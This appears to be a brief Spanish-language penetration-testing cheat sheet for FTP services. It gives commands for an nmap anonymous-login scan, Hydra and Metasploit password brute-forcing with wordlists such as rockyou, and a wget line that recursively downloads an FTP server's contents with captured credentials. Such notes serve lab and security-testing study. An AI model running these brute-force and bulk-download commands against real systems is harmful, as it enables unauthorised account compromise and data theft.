### Escaneo vulnerabilidades FTP
```bash
nmap <ip> -p <puerto> -n -Pn --script=ftp-anon
```
###  Fuerza bruta FTP con Hydra

```bash
# Cuando tengo el usuario y quiero sacar la contraseña
hydra -l <usuario> -P /usr/share/wordlists/rockyou.txt ftp://10.10.10.10

# Cuando tengo una contraseña y quiero sacar el usuario
hydra -L /usr/share/wordlists/metasploit/unix_users.txt <usuario> -p password123 ftp://10.10.10.10
```

* -l minúscula especifica un usuario en concreto
* -L mayúscila especifica un diccionario de usuarios
* -p minúscula (mismo para contraseñas)
* -P mayúscula (mismo para  contraseñas)

### Fuerza bruta FTP con Metasploit
```bash
# search ftp_login, seleccionamos auxiliary/scanner/ftp/ftp_login
	Completamos los datos necesarios y "run"
```

### Descargar de forma recursiva todo de un FTP
```bash
wget -r ftp://"<user>":"<pass>"@ip
```









